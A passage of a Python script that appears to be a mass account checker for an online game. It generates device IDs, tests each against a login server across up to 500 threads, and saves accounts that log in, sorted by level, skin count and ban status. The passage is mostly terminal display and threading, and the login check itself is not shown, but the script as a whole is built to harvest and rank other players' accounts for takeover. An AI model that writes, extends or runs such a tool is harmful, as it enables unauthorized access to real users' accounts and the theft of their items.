        '⏱ Elapsed', f'[bold bright_white]{elapsed:.1f}s[/]',
        '📁 Total', f'[bold bright_white]{total}[/]'
    )
    
    # Level distribution
    lv_table = Table(show_header=True, box=MINIMAL, header_style='bold green on grey11', padding=(0, 1))
    lv_table.title = '[bold green]📈 LEVEL DISTRIBUTION[/]'
    lv_table.add_column('Range', style='dim', width=8)
    lv_table.add_column('Count', style='bold bright_white', width=8)
    lv_table.add_column('', width=15)
    
    level_data = [
        ('9-30', stats['lv_9_30'], 'white'),
        ('31-50', stats['lv_31_50'], 'bright_yellow'),
        ('51-100', stats['lv_51_100'], 'bright_green'),
        ('101-200', stats['lv_101_200'], 'bright_cyan'),
        ('200+', stats['lv_200_plus'], 'bright_magenta'),
    ]
    
    for range_name, count, color in level_data:
        bar_len = min(15, int(count / max(stats['valid'], 1) * 15)) if stats['valid'] > 0 else 0
        bar = '█' * bar_len + '░' * (15 - bar_len)
        lv_table.add_row(
            range_name,
            str(count),
            f'[{color}]{bar}[/]'
        )
    
    # Skin distribution
    sk_table = Table(show_header=True, box=MINIMAL, header_style='bold magenta on grey11', padding=(0, 1))
    sk_table.title = '[bold magenta]🎨 SKIN DISTRIBUTION[/]'
    sk_table.add_column('Range', style='dim', width=8)
    sk_table.add_column('Count', style='bold bright_white', width=8)
    sk_table.add_column('', width=15)
    
    skin_data = [
        ('20-50', stats['sk_20_50'], 'white'),
        ('51-100', stats['sk_51_100'], 'bright_yellow'),
        ('101-200', stats['sk_101_200'], 'bright_green'),
        ('201-300', stats['sk_201_300'], 'bright_cyan'),
        ('301-400', stats['sk_301_400'], 'bright_magenta'),
        ('401+', stats['sk_401_plus'], 'bright_red'),
    ]
    
    for range_name, count, color in skin_data:
        bar_len = min(15, int(count / max(stats['valid'], 1) * 15)) if stats['valid'] > 0 else 0
        bar = '█' * bar_len + '░' * (15 - bar_len)
        sk_table.add_row(
            range_name,
            str(count),
            f'[{color}]{bar}[/]'
        )
    
    # Combine everything using RichGroup
    content = RichGroup(
        Align.center(progress),
        Align.center(speed_row),
        Text(''),
        mid_table,
        Text(''),
        Columns([lv_table, sk_table], equal=True)
    )
    
    return Panel(
        content,
        box=DOUBLE,
        border_style='bright_cyan',
        title='[bold bright_magenta]◇  LIVE SCAN MONITOR  ◇[/]',
        subtitle='[dim cyan]━━━  Real-time Progress  ━━━[/]',
        style='on grey7',
        padding=(1, 2)
    )

def _rtxt(did: str, p: Dict[str, Any]) -> Text:
    """Beautiful success message"""
    sid = did[-8:] if len(did) >= 8 else did
    lvl = p.get('level', 0)
    sk = p.get('skin_count', 0)
    ban = p.get('ban_status', 'Not Banned')
    
    # Level color
    try:
        li = int(lvl)
        level_style = 'bright_cyan' if li > 200 else 'bright_green' if li > 100 else 'green' if li > 50 else 'bright_yellow' if li > 30 else 'white'
    except:
        level_style = 'white'
    
    t = Text()
    t.append('  ✅ ', 'bright_green')
    t.append(f'…{sid}', 'bright_cyan bold')
    t.append('  ┃  ', 'dim')
    t.append(escape(str(p.get('nickname', '?'))[:20]), 'bold white')
    t.append('  ┃  ', 'dim')
    t.append(f'Lv:{lvl}', level_style)
    t.append('  ┃  ', 'dim')
    t.append(f'🆔{p.get("player_id", "?")}', 'bright_green')
    t.append('  ┃  ', 'dim')
    t.append(f'🌐{p.get("server", "?")}', 'bright_magenta')
    t.append('  ┃  ', 'dim')
    t.append(f'🎨{sk}', 'bold white')
    t.append('  ┃  ', 'dim')
    rank = str(p.get('current_rank', '?'))[:12]
    t.append(f'🏆{rank}', 'bright_yellow')
    
    if 'Banned' in ban or 'Suspended' in ban:
        t.append('  ⚠️ ', 'dim')
        t.append(ban[:18], 'bright_red bold')
    
    return t

def _etxt(did: str, err: str) -> Text:
    """Beautiful error message"""
    sid = did[-8:] if len(did) >= 8 else did
    t = Text()
    t.append('  ❌ ', 'bright_red')
    t.append(f'…{sid}', 'dim bright_cyan')
    t.append('  ┃  ', 'dim')
    t.append(escape(err[:60]), 'dim red')
    return t

def _make_summary(stats: Dict[str, Any], base_folder: str, levels_dir: str, skins_dir: str, elapsed: float) -> Panel:
    """Beautiful summary panel"""
    v = stats['valid']
    nv = stats['not_valid']
    fi = stats['filtered']
    total = v + nv + fi
    spd = total / max(elapsed, 0.001)
    
    # Main statistics
    main_table = Table(show_header=True, box=HEAVY, header_style='bold bright_magenta on grey11', border_style='bright_cyan', padding=(0, 2))
    main_table.add_column('📊 METRIC', style='bright_cyan bold', width=18)
    main_table.add_column('VALUE', style='bold bright_white', width=16, justify='right')
    main_table.add_column('📊 METRIC', style='bright_cyan bold', width=18)
    main_table.add_column('VALUE', style='bold bright_white', width=16, justify='right')
    
    main_table.add_row(
        '✅ Valid', f'[bright_green bold]{v}[/]',
        '❌ Invalid', f'[bright_red bold]{nv}[/]'
    )
    main_table.add_row(
        '📂 Filtered (Lv1-8)', f'[bright_yellow bold]{fi}[/]',
        '📁 Total', f'[bold bright_white]{total}[/]'
    )
    main_table.add_row(
        '⏱ Time', f'[bold bright_white]{elapsed:.2f}s[/]',
        '⚡ Speed', f'[bold bright_yellow]{spd:.1f}/s[/]'
    )
    
    # Output files
    file_table = Table(show_header=True, box=ROUNDED, header_style='bold bright_cyan on grey11', border_style='bright_magenta', padding=(0, 1))
    file_table.add_column('📁 CATEGORY', style='bright_cyan bold', width=14)
    file_table.add_column('📄 FILE', style='dim white', width=30)
    file_table.add_column('📊 COUNT', style='bold bright_white', width=8, justify='right')
    
    # All valid
    file_table.add_row(
        '[bold bright_green]ALL VALID[/]',
        escape(os.path.join(base_folder, 'all_valid.txt')),
        str(v)
    )
    
    # Level files
    level_files = [
        ('📈 Level 9-30', 'level_9-30.txt', stats['lv_9_30']),
        ('📈 Level 31-50', 'level_31-50.txt', stats['lv_31_50']),
        ('📈 Level 51-100', 'level_51-100.txt', stats['lv_51_100']),
        ('📈 Level 101-200', 'level_101-200.txt', stats['lv_101_200']),
        ('📈 Level 200+', 'level_200plus.txt', stats['lv_200_plus']),
    ]
    
    for label, fn, cnt in level_files:
        if cnt > 0:
            file_table.add_row(
                f'[bright_green]{label}[/]',
                escape(os.path.join(levels_dir, fn)),
                str(cnt)
            )
    
    # Skin files
    skin_files = [
        ('🎨 Skin 20-50', 'skin_20-50.txt', stats['sk_20_50']),
        ('🎨 Skin 51-100', 'skin_51-100.txt', stats['sk_51_100']),
        ('🎨 Skin 101-200', 'skin_101-200.txt', stats['sk_101_200']),
        ('🎨 Skin 201-300', 'skin_201-300.txt', stats['sk_201_300']),
        ('🎨 Skin 301-400', 'skin_301-400.txt', stats['sk_301_400']),
        ('🎨 Skin 401+', 'skin_401-700plus.txt', stats['sk_401_plus']),
    ]
    
    for label, fn, cnt in skin_files:
        if cnt > 0:
            file_table.add_row(
                f'[bright_magenta]{label}[/]',
                escape(os.path.join(skins_dir, fn)),
                str(cnt)
            )
    
    # Footer
    footer = Text()
    footer.append('  📂 ', 'bright_cyan')
    footer.append(base_folder, 'bold bright_green')
    footer.append('  ┃  ', 'dim')
    footer.append('📅 ', 'bright_cyan')
    footer.append(datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S'), 'dim white')
    
    content = RichGroup(
        main_table,
        Text(''),
        file_table,
        Text(''),
        Align.center(footer)
    )
    
    return Panel(
        content,
        box=DOUBLE,
        border_style='bright_cyan',
        title='[bold bright_magenta]◇  SCAN COMPLETE  ◇[/]',
        subtitle='[dim cyan]━━━  All results saved  ━━━[/]',
        padding=(1, 2)
    )

def _run(device_ids: List[str], thread_count: int, base_folder: str) -> None:
    levels_dir, skins_dir, all_valid_path = _setup_folders(base_folder)
    file_lock = _threading.Lock()
    stats_lock = _threading.Lock()
    start_time = time.time()
    
    stats: Dict[str, Any] = {
        'total': len(device_ids),
        'checked': 0,
        'valid': 0,
        'not_valid': 0,
        'filtered': 0,
        'threads': thread_count,
        'elapsed': 0.0,
        'lv_9_30': 0,
        'lv_31_50': 0,
        'lv_51_100': 0,
        'lv_101_200': 0,
        'lv_200_plus': 0,
        'sk_20_50': 0,
        'sk_51_100': 0,
        'sk_101_200': 0,
        'sk_201_300': 0,
        'sk_301_400': 0,
        'sk_401_plus': 0,
        'folder': base_folder
    }
    live_ref: List[Optional[Live]] = [None]

    def _upd_sk(skin: int):
        if 20 <= skin <= 50:
            stats['sk_20_50'] += 1
        elif skin <= 100:
            stats['sk_51_100'] += 1
        elif skin <= 200:
            stats['sk_101_200'] += 1
        elif skin <= 300:
            stats['sk_201_300'] += 1
        elif skin <= 400:
            stats['sk_301_400'] += 1
        elif skin >= 401:
            stats['sk_401_plus'] += 1

    def _write(did: str, p: Dict[str, Any], li: int, sk: int):
        line = _save_line(did, p)
        with file_lock:
            with open(all_valid_path, 'a', encoding='utf-8') as f:
                f.write(line + '\n')
            lf = _lv_file(levels_dir, li)
            if lf:
                with open(lf, 'a', encoding='utf-8') as f:
                    f.write(line + '\n')
            sf = _sk_file(skins_dir, sk)
            if sf:
                with open(sf, 'a', encoding='utf-8') as f:
                    f.write(line + '\n')

    def _worker(did: str):
        res = check_device_id(did)
        now = time.time()
        lv = live_ref[0]
        
        if res.get('status') == 'success':
            p = res['player_data']
            try:
                li = int(p.get('level', 0))
            except:
                li = 0
            try:
                sk = int(p.get('skin_count', 0))
            except:
                sk = 0
            
            if li < 9:
                with stats_lock:
                    stats['checked'] += 1
                    stats['filtered'] += 1
                    stats['elapsed'] = now - start_time
                if lv:
                    lv.console.print(_rtxt(did, p))
                return
            
            with stats_lock:
                stats['checked'] += 1
                stats['valid'] += 1
                stats['elapsed'] = now - start_time
                if li <= 30:
                    stats['lv_9_30'] += 1
                elif li <= 50:
                    stats['lv_31_50'] += 1
                elif li <= 100:
                    stats['lv_51_100'] += 1
                elif li <= 200:
                    stats['lv_101_200'] += 1
                else:
                    stats['lv_200_plus'] += 1
                _upd_sk(sk)
            
            if lv:
                lv.console.print(_rtxt(did, p))
            _write(did, p, li, sk)
        else:
            with stats_lock:
                stats['checked'] += 1
                stats['not_valid'] += 1
                stats['elapsed'] = now - start_time
            if lv:
                lv.console.print(_etxt(did, res.get('error', 'unknown')))

    # Start live display
    with Live(_stats_panel(stats), console=console, refresh_per_second=10, auto_refresh=True, transient=False, vertical_overflow='visible') as live:
        live_ref[0] = live
        stop_evt = _threading.Event()

        def _refresher():
            while not stop_evt.is_set():
                with stats_lock:
                    snap = dict(stats)
                live.update(_stats_panel(snap))
                stop_evt.wait(0.1)
            with stats_lock:
                snap = dict(stats)
            live.update(_stats_panel(snap))
        
        ref_th = _threading.Thread(target=_refresher, daemon=True)
        ref_th.start()
        
        try:
            with ThreadPoolExecutor(max_workers=thread_count) as pool:
                futs = [pool.submit(_worker, did) for did in device_ids]
                try:
                    for fut in as_completed(futs):
                        fut.result()
                except KeyboardInterrupt:
                    live.console.print('\n[bold bright_red]  ⚠ Interrupted — saving...[/]')
        finally:
            stop_evt.set()
            ref_th.join(timeout=2.0)
        
        with stats_lock:
            snap = dict(stats)
        live.update(_stats_panel(snap))
    
    elapsed = time.time() - start_time
    with stats_lock:
        snap = dict(stats)
    
    console.print()
    console.print(_make_summary(snap, base_folder, levels_dir, skins_dir, elapsed))
    _save_history()

def _interactive_setup() -> Tuple[str, str, int]:
    """Beautiful interactive setup wizard"""
    # Welcome panel
    welcome = Panel(
        RichGroup(
            Align.center(Text('⚡ CONFIGURATION WIZARD ⚡', style='bold bright_magenta')),
            Text(''),
            Align.center(Text('Configure your scan parameters below', style='dim cyan')),
        ),
        box=DOUBLE,
        border_style='bright_cyan',
        padding=(1, 2)
    )
    console.print(welcome)
    console.print()
    
    # Input file
    console.print(Panel(
        RichGroup(
            Text('📁 DEVICE ID INPUT', style='bold bright_cyan'),
            Text('  One device ID per line in text file', style='dim white'),
        ),
        box=ROUNDED,
        border_style='bright_cyan',
        padding=(0, 2)
    ))
    input_file = _cyber_input('Input file path', 'device_ids.txt')
    console.print()
    
    # Output folder
    console.print(Panel(
        RichGroup(
            Text('📂 OUTPUT FOLDER', style='bold bright_cyan'),
            Text('  Levels and Skins subfolders will be created', style='dim white'),
        ),
        box=ROUNDED,
        border_style='bright_cyan',
        padding=(0, 2)
    ))
    now = datetime.datetime.now()
    def_folder = f"results-{now.strftime('%B').lower()}-{now.day}-{now.strftime('%I').lstrip('0') or '12'}{now.strftime('%M%p').lower()}"
    folder_name = _cyber_input('Output folder name', def_folder)
    console.print()
    
    # Threads
    console.print(Panel(
        RichGroup(
            Text('⚡ THREAD COUNT', style='bold bright_cyan'),
            Text('  Parallel workers for faster scanning (1-500)', style='dim white'),
        ),
        box=ROUNDED,
        border_style='bright_cyan',
        padding=(0, 2)
    ))
    threads = _cyber_int('Threads', 50, 1, 500)
    console.print()
    
    folder_path = folder_name if os.path.isabs(folder_name) else os.path.join(_SCRIPT_DIR, folder_name)
    
    # Configuration summary with tree
    tree = Table(show_header=False, box=None, padding=(0, 1))
    tree.add_column('', style='bright_cyan')
    tree.add_row(f'📂 [bold]{escape(folder_name)}[/]/')
    tree.add_row(f'  ├── 📄 all_valid.txt')
    tree.add_row(f'  ├── 📂 levels/')
    for _, _, fn in LEVEL_BRACKETS:
        tree.add_row(f'  │   ├── 📄 {fn}')
    tree.add_row(f'  └── 📂 skins/')
    for _, _, fn in SKIN_BRACKETS:
        tree.add_row(f'      ├── 📄 {fn}')
    
    cfg = Table(show_header=True, header_style='bold bright_magenta on grey11', box=HEAVY, border_style='bright_cyan', padding=(0, 2))
    cfg.add_column('📊 PARAMETER', style='bright_cyan bold', width=18)
    cfg.add_column('VALUE', style='bold bright_white', width=30)
    cfg.add_row('📁 Input File', escape(input_file))
    cfg.add_row('📂 Output Folder', escape(folder_name))
    cfg.add_row('⚡ Threads', str(threads))
    cfg.add_row('🌐 Login Server', f'{LOGIN_HOST}:{LOGIN_PORT}')
    cfg.add_row('🕐 Start Time', datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S'))
    
    console.print(Panel(
        RichGroup(
            cfg,
            Text(''),
            Align.center(Text('📁 Folder Structure', style='bold bright_cyan')),
            tree,
            Text(''),
            Align.center(Text('▶  Press ENTER to launch scan  ◀', style='bold bright_yellow'))
        ),
        box=DOUBLE,
        border_style='bright_cyan',
        title='[bold bright_magenta]◇  CONFIGURATION  ◇[/]',
        padding=(1, 2)
    ))
    console.print()
    _cyber_input('Press ENTER to start', '')
    console.print()
    
    return (input_file, folder_path, threads)

def main() -> None:
    args = sys.argv[1:]
    console.print(_make_banner())
    console.print()
    
    if not args:
        try:
            input_file, folder_path, threads = _interactive_setup()
        except KeyboardInterrupt:
            console.print('\n[bold bright_red]  ⚠ Aborted by user[/]')
            sys.exit(0)
        
        path = input_file if os.path.isabs(input_file) else os.path.join(_SCRIPT_DIR, input_file)
        if not os.path.isfile(path):
            console.print(Panel(
                f'[bright_red]✘ File not found: {escape(path)}[/]',
                box=HEAVY,
                border_style='bright_red',
                padding=(1, 2)
            ))
            sys.exit(1)
        
        ids = _read_ids(path)
        if not ids:
            console.print('[bright_yellow]  ⚠ No device IDs found in file[/]')
            sys.exit(0)
        
        console.print(Panel(
            f'[bright_green]✅ Loaded [bold]{len(ids)}[/bold] device IDs[/]\n[dim]  Starting scan with {threads} threads...[/]',
            box=ROUNDED,
            border_style='bright_green',
            padding=(0, 2)
        ))
        console.print()
        _run(ids, threads, folder_path)
        return
    
    if args[0] == '--generate':
        try:
            count = int(args[1]) if len(args) > 1 else 100
        except:
            count = 100
        outp = args[2] if len(args) > 2 else os.path.join(_SCRIPT_DIR, 'deviceIds.txt')
        ids = generate_device_ids(count)
        with open(outp, 'w', encoding='utf-8') as f:
            f.write('\n'.join(ids) + '\n')
        console.print(Panel(
            f'[bright_green]✅ Generated [bold]{count}[/bold] device IDs[/]\n[dim]  Saved to: {escape(outp)}[/]',
            box=DOUBLE,
            border_style='bright_cyan',
            padding=(1, 2)
        ))
        _save_history()
        return
    
    # Direct mode
    device_ids: List[str] = []
    for arg in args:
        if os.path.isfile(arg):
            loaded = _read_ids(arg)
            console.print(f'[dim]  Loaded [bright_white]{len(loaded)}[/] IDs from [bright_white]{escape(arg)}[/][/]')
            device_ids.extend(loaded)
        elif len(arg) >= 10:
            device_ids.append(arg.strip())
    
    if not device_ids:
        console.print(Panel(
            '[bright_red]✘ No device IDs found[/]',
            box=HEAVY,
            border_style='bright_red',
            padding=(1, 2)
        ))
        sys.exit(1)
    
    # Quick folder setup
    now = datetime.datetime.now()
    def_folder = f"results-{now.strftime('%B').lower()}-{now.day}-{now.strftime('%I').lstrip('0') or '12'}{now.strftime('%M%p').lower()}"
    folder_name = _cyber_input('Output folder name', def_folder)
    folder_path = folder_name if os.path.isabs(folder_name) else os.path.join(_SCRIPT_DIR, folder_name)
    console.print()
    
    threads = _cyber_int('Threads', 50, 1, 500)
    console.print()
    
    console.print(Panel(
        f'[bright_green]✅ {len(device_ids)} IDs loaded[/]\n[dim]  Output: {escape(folder_path)}/[/]',
        box=ROUNDED,
        border_style='bright_green',
        padding=(0, 2)
    ))
    console.print()
    _run(device_ids, threads, folder_path)

if __name__ == '__main__':
    main()